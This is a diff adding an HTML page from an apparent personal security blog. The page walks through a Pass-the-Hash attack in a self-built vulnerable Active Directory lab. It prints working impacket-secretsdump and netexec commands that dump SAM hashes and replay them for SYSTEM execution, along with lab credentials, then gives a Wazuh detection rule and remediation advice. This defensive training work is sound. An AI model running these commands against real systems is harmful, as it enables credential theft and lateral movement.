@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pass-the-Hash | Hunter Weygandt</title>
+    <meta name="description" content="Pass-the-Hash in the Vulnerable Active Directory Lab">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="canonical" href="https://hunterweygandt.com/posts/vulnerable-ad-lab/pass-the-hash.html">
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
+</head>
+<body>
+
+    <header>
+        <canvas id="circuit-canvas"></canvas>
+        <div class="header-scrim"></div>
+
+        <div class="terminal-header">
+            <p class="prompt">visitor@hunterweygandt:~$ cat pass-the-hash.html<span class="cursor">|</span></p>
+            <h1>Pass-the-Hash</h1>
+            <p class="tagline">Vulnerable Active Directory Lab &middot; 2026</p>
+        </div>
+
+        <div class="social-links">
+            <a href="https://github.com/hunterweygandt/Vulnerable-AD-DC-Project---Hunter-Weygandt" target="_blank"><i class="fab fa-github"></i></a>
+        </div>
+    </header>
+
+    <nav>
+        <a href="../../index.html#about">About</a>
+        <a href="../../index.html#skills">Skills</a>
+        <a href="../../index.html#certifications">Certifications</a>
+        <a href="../../index.html#projects">Projects</a>
+        <a href="../../docs.html">Documentation</a>
+    </nav>
+
+    <article>
+        <a class="back-link" href="../vulnerable-ad-lab.html">&larr; Back to the other documents</a>
+
+        <h1>Pass-the-Hash</h1>
+        <h2>Summary</h2>
+        <p>Pass-the-Hash (PtH) abuses the fact that Windows NTLM authentication accepts a password's hash in place of the password itself. An attacker who obtains a local account's NTLM hash from one machine can authenticate to any other machine that shares those credentials, without ever knowing or cracking the password. The hash is the credential. When a local administrator account is reused across many workstations (a common imaging mistake), a single compromised machine's hash unlocks the entire fleet.</p>
+        <p><strong>MITRE ATT&CK:</strong> T1550.002 (Use Alternate Authentication Material: Pass the Hash) <strong>Path:</strong> compromised WS01 -> reused local admin hash -> lateral movement to WS02</p>
+
+        <h2>The misconfiguration</h2>
+        <p>Both WS01 and WS02 have a local administrator account, <code>localadmin</code>, with the same password (and therefore the same NTLM hash). This mirrors the classic pre-LAPS failure: imaging every workstation from one template bakes an identical local admin credential into the whole fleet. One machine's hash then works everywhere.</p>
+        <p>This is often left in place deliberately, IT sometimes use a shared local admin account when setting up new computers for the first time, and leaves it enabled across the fleet for convenience. That convenience is exactly what turns a single compromised host into fleet-wide access.</p>
+<pre><code><span class="tok-cmt"># planted identically on BOTH WS01 and WS02</span>
+<span class="tok-cmd">net</span> user localadmin <span class="tok-str">'P@ssw0rd-Reuse-2025!'</span> /add
+<span class="tok-cmd">net</span> localgroup Administrators localadmin /add</code></pre>
+        <p>A second condition is required for full remote code execution: <code>LocalAccountTokenFilterPolicy</code>. By default, Windows strips the admin token from local accounts authenticating remotely (UAC remote restriction), so a local- account PtH can authenticate but not execute privileged commands. Environments that enable this policy (common for certain remote-management tools) remove that blockage:</p>
+<pre><code><span class="tok-cmt"># on WS02 - enables full remote code execution for local-account PtH</span>
+<span class="tok-fn">New-ItemProperty</span> <span class="tok-param">-Path</span> <span class="tok-str">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span> <span class="tok-op">`</span>
+  <span class="tok-param">-Name</span> <span class="tok-str">"LocalAccountTokenFilterPolicy"</span> <span class="tok-param">-Value</span> 1 <span class="tok-param">-PropertyType</span> DWord <span class="tok-param">-Force</span></code></pre>
+
+        <h2>Execution</h2>
+        <p>This threads into the existing kill chain. Having already reached Domain Admin via the ACL-abuse slice (amoss), the attacker uses that access, domain admin is an admin on every domain-joined box, to dump WS01's local SAM and discover the reused local hash. The password was never known, it was derived from access already earned.</p>
+        <p><strong>Discover the hash (dump WS01's local SAM as the earned DA):</strong></p>
+<pre><code><span class="tok-cmd">impacket-secretsdump</span> <span class="tok-str">'ecorp.local/amoss:LabP@ssw0rd!2025'</span>@<span class="tok-param">10.0.0.203</span>
+<span class="tok-cmt"># -> localadmin:1001:aad3b435...:a8862388dfc4c8f7edc4da3b8602bfe9:::</span></code></pre>
+        <figure>
+            <img src="../../images/vulnerable-ad-lab-images/PassTheHash-HashDump.png" alt="Kali terminal running impacket-secretsdump as the domain user amoss against a workstation at 10.0.0.203. It enables the RemoteRegistry service, reads the boot key, and dumps the local SAM hashes. Among the built-in accounts, the planted localadmin account (RID 1002) appears with its NTLM hash a8862388dfc4c8f7edc4da3b8602bfe9 - the credential that will be replayed against the other workstation. The tool then cleans up and restores RemoteRegistry to its disabled state.">
+            <figcaption>Dumping the local SAM on WS01: using <code>amoss</code>'s domain access, <code>secretsdump</code> pulls the planted <code>localadmin</code> NTLM hash (<code>a8862388&hellip;</code>). Because the same account was created identically on both workstations, this one hash unlocks both - no cracking required.</figcaption>
+        </figure>
+        <p><strong>Replay the hash to WS02 (no password):</strong></p>
+<pre><code><span class="tok-cmt"># authenticate to WS02's local account with the stolen hash</span>
+<span class="tok-cmd">netexec</span> smb 10.0.0.90 <span class="tok-param">-u</span> localadmin <span class="tok-param">-H</span> a8862388dfc4c8f7edc4da3b8602bfe9 <span class="tok-param">--local-auth</span>
+<span class="tok-cmt"># -> [+] WS02\localadmin:... (Pwn3d!)</span>
+
+<span class="tok-cmt"># execute as SYSTEM on WS02</span>
+<span class="tok-cmd">netexec</span> smb 10.0.0.90 <span class="tok-param">-u</span> localadmin <span class="tok-param">-H</span> a8862388dfc4c8f7edc4da3b8602bfe9 <span class="tok-param">--local-auth</span> <span class="tok-param">-x</span> <span class="tok-str">"whoami"</span>
+<span class="tok-cmt"># -> nt authority\system</span></code></pre>
+        <p>The <code>--local-auth</code> flag authenticates against WS02's local account database, not the domain. The <code>[+] (Pwn3d!)</code> confirms the hash worked; <code>whoami</code> returning <code>nt authority\system</code> confirms full compromise of WS02, achieved with a hash and no password.</p>
+        <p><strong>Continue the spread:</strong> dumping WS02's own SAM shows the identical localadmin hash present there too, the visible proof of credential reuse that makes fleet- wide movement possible:</p>
+<pre><code><span class="tok-cmd">netexec</span> smb 10.0.0.90 <span class="tok-param">-u</span> localadmin <span class="tok-param">-H</span> a8862388dfc4c8f7edc4da3b8602bfe9 <span class="tok-param">--local-auth</span> <span class="tok-param">--sam</span>
+<span class="tok-cmt"># -> localadmin:1002:...:a8862388dfc4c8f7edc4da3b8602bfe9::: (same hash as WS01)</span></code></pre>
+        <figure>
+            <img src="../../images/vulnerable-ad-lab-images/PassTheHash-Exploit.png" alt="Kali terminal running netexec smb against WS02 (10.0.0.90) four times with the localadmin NTLM hash and --local-auth. The first run returns [+] WS02\localadmin (Pwn3d!) on Windows 11 / Server 2025 Build 26100. The second runs whoami - WMIEXEC fails and it falls back to atexec - returning nt authority\system. The third runs net user, listing the local accounts. The fourth uses --sam to dump WS02's local hashes, showing localadmin at RID 1002 with the same hash a8862388dfc4c8f7edc4da3b8602bfe9 that was stolen from WS01.">
+            <figcaption>The pivot lands: the <code>localadmin</code> hash dumped from WS01 authenticates to WS02 (<code>Pwn3d!</code>) and executes as <code>nt authority\system</code>. The <code>--sam</code> dump confirms WS02's <code>localadmin</code> carries the identical hash - one credential, full SYSTEM on a second machine, no password ever cracked.</figcaption>
+        </figure>
+        <p>Why PtH matters even after Domain Admin: it moves laterally without touching the domain, and the local hash survives domain credential resets, so it persists through incident response that only rotates domain accounts. In a real breach, PtH also happens before full compromise, one workstation's reused hash spreads to the whole fleet without cracking a single password.</p>
+        <p>The local-account choice is deliberate for evasion: authenticating with a local account keeps the activity off the domain controller entirely. A domain logon would generate authentication events on the DC (where defenders watch most closely); a local-account network logon is recorded only on the target workstation, so an attacker using the reused local hash avoids lighting up DC-centric monitoring. That is precisely why endpoint detection matters.</p>
+
+        <h2>Telemetry generated</h2>
+        <p>The lateral authentication lands on <strong>WS02</strong>, generating Event 4624 (successful logon). The distinguishing fields:</p>
+        <div class="table-scroll">
+            <table class="attacks-table">
+                <thead>
+                    <tr>
+                        <th>Field</th>
+                        <th>Value</th>
+                        <th>Why it matters</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="mono"><code>win.system.eventID</code></td>
+                        <td class="mono">4624</td>
+                        <td>Successful logon</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.logonType</code></td>
+                        <td class="mono">3</td>
+                        <td>Network logon</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.authenticationPackageName</code></td>
+                        <td class="mono">NTLM</td>
+                        <td>PtH is always NTLM, never Kerberos</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.targetUserName</code></td>
+                        <td class="mono">localadmin</td>
+                        <td>The reused local account</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.targetDomainName</code></td>
+                        <td class="mono">WS02</td>
+                        <td>The <strong>machine name</strong>, not the AD domain</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.ipAddress</code></td>
+                        <td class="mono">10.0.0.76</td>
+                        <td>The attacker source</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <p>The single sharpest indicator: <code>targetDomainName</code> equals the workstation name (WS02), not the AD domain (ECORP). A network logon whose "domain" is a computer means a local account authenticated across the network, which almost never happens legitimately in a domain, where inter-machine auth uses domain accounts via Kerberos. The all-zero Logon GUID is a secondary NTLM tell (Kerberos logons carry a real GUID).</p>
+        <p>Audit requirement: "Audit Logon" (Success) enabled on the workstation. </p>
+
+        <h2>Detection</h2>
+        <p>Unlike the failure-based detections (spray) or anomalous-ticket detections (roasting), pass-the-hash produces a successful logon, a valid hash is a valid credential, so there is no failure signature. The rule must fire on a suspicious success, which is a harder and more advanced detection concept.</p>
+        <p>Type-3 NTLM logons alone are too noisy (some legitimate traffic is NTLM). The fidelity comes from the discriminator: the logon uses a <code>local account</code> (target domain = machine name) over the network. That combination is the lateral- movement signature.</p>
+        <p>Custom rule (<code>/var/ossec/etc/rules/local_rules.xml</code>):</p>
+<pre><code><span class="tok-punc">&lt;</span><span class="tok-tag">group</span> <span class="tok-attr">name</span>=<span class="tok-str">"pass_the_hash,lateral_movement,attack,windows,"</span><span class="tok-punc">&gt;</span>
+
+  <span class="tok-cmt">&lt;!-- Pass-the-Hash: NTLM network logon by a local account (targetDomain = machine) --&gt;</span>
+  <span class="tok-punc">&lt;</span><span class="tok-tag">rule</span> <span class="tok-attr">id</span>=<span class="tok-str">"100240"</span> <span class="tok-attr">level</span>=<span class="tok-str">"12"</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">if_sid</span><span class="tok-punc">&gt;</span>60103<span class="tok-punc">&lt;/</span><span class="tok-tag">if_sid</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.system.eventID"</span><span class="tok-punc">&gt;</span>^4624$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.eventdata.logonType"</span><span class="tok-punc">&gt;</span>^3$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.eventdata.authenticationPackageName"</span><span class="tok-punc">&gt;</span>^NTLM$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.eventdata.targetDomainName"</span><span class="tok-punc">&gt;</span>WS0\d+|WORKGROUP<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">description</span><span class="tok-punc">&gt;</span>Possible Pass-the-Hash: NTLM network logon by local account <span class="tok-var">$(win.eventdata.targetUserName)</span> from <span class="tok-var">$(win.eventdata.ipAddress)</span> to <span class="tok-var">$(win.eventdata.targetDomainName)</span><span class="tok-punc">&lt;/</span><span class="tok-tag">description</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">mitre</span><span class="tok-punc">&gt;</span><span class="tok-punc">&lt;</span><span class="tok-tag">id</span><span class="tok-punc">&gt;</span>T1550.002<span class="tok-punc">&lt;/</span><span class="tok-tag">id</span><span class="tok-punc">&gt;</span><span class="tok-punc">&lt;/</span><span class="tok-tag">mitre</span><span class="tok-punc">&gt;</span>
+  <span class="tok-punc">&lt;/</span><span class="tok-tag">rule</span><span class="tok-punc">&gt;</span>
+
+<span class="tok-punc">&lt;/</span><span class="tok-tag">group</span><span class="tok-punc">&gt;</span></code></pre>
+        <p>Rule design notes:</p>
+        <ul>
+            <li><strong>Type 3 + NTLM + local-account domain</strong> is the three-part signature. The <code>targetDomainName</code> matching the workstation name (WS01/WS02) is what separates malicious lateral movement from normal domain NTLM traffic.</li>
+            <li>Fires on a <strong>successful</strong> logon, not a failure, so it detects an anomalous _pattern_ of success rather than an error.</li>
+            <li>In production, the <code>WS0\d+</code> match would generalize to "target domain equals any local computer name" rather than a specific naming scheme.</li>
+        </ul>
+        <p>Result: rule 100240 fired at level 12, showing localadmin authenticating from the attacker IP to WS02.</p>
+        <figure>
+            <img src="../../images/vulnerable-ad-lab-images/PassTheHash-Wazuh.png" alt="Wazuh Events filtered to rule.id 100240, showing 9 hits. Each fires the custom Pass-the-Hash rule with 'Possible Pass-the-Hash: NTLM network logon by local account localadmin from 10.0.0.76 to WS02'. Every row shows authenticationPackageName NTLM, targetUserName localadmin, source ipAddress 10.0.0.76, and agent.name WS02 - the events are reported by the workstation agent itself, not the domain controller.">
+            <figcaption>The custom rule <code>100240</code> catches every hash-replay logon: NTLM network authentication by the local <code>localadmin</code> account from the attacker at <code>10.0.0.76</code>, reported by the <code>WS02</code> agent. Nine hits map to the repeated <code>netexec</code> runs - each auth, command, and SAM dump left its own <code>4624</code>.</figcaption>
+        </figure>
+        <p><strong>False positives / tuning:</strong> legitimate local-account network logons do occur, some backup agents, monitoring tools, and legacy software authenticate locally over the network. Those sources should be baselined and allowlisted by source IP or account. The rule is high-fidelity in a clean domain (where local-account network logons are rare) but needs environment-specific tuning where such tools exist. Correlating with the source being another workstation (not a server or management host) further raises fidelity.</p>
+
+        <h2>Remediation</h2>
+        <ul>
+            <li>Deploy <strong>LAPS</strong> (Local Administrator Password Solution) so every machine has a unique, rotating local admin password, no reused hash, no fleet-wide unlock.</li>
+            <li>Deny local accounts network logon rights via GPO ("Deny access to this computer from the network" for local accounts), which blocks local-account lateral movement outright.</li>
+            <li>Leave <code>LocalAccountTokenFilterPolicy</code> at its default (disabled) unless a documented need requires it.</li>
+            <li>Enforce SMB signing and consider disabling NTLM where feasible.</li>
+            <li>Monitor for local-account network logons (rule 100240).</li>
+        </ul>
+
+        <h2>Notes/Troubleshooting</h2>
+        <ul>
+            <li><strong>Local-account PtH is gated by <code>LocalAccountTokenFilterPolicy</code>.</strong> By default, UAC remote restriction let the hash authenticate (<code>Pwn3d!</code>) but blocked code execution (<code>rpc_s_access_denied</code> / <code>ADMIN$ not writable</code>). Enabling the policy on WS02 unlocked full remote SYSTEM execution.</li>
+            <li><strong>Execution-method fallback.</strong> netexec tried WMI (blocked by an RPC/DCOM timeout) and automatically fell back to <code>atexec</code> (scheduled task), which succeeded. Real attackers cycle execution methods.</li>
+            <li><strong>Endpoint audit policy.</strong> The build script set audit policy on the DC only. Workstation logon events (4624) must be audited on the workstation itself for this detection to work.</li>
+        </ul>
+
+        <a class="back-link" href="../vulnerable-ad-lab.html">&larr; Back to the other documents</a>
+    </article>
+
+    <footer>
+        <p>&copy; 2026 Hunter Weygandt</p>
+    </footer>
+
+    <script src="../../circuit.js"></script>
+
+</body>
+</html>
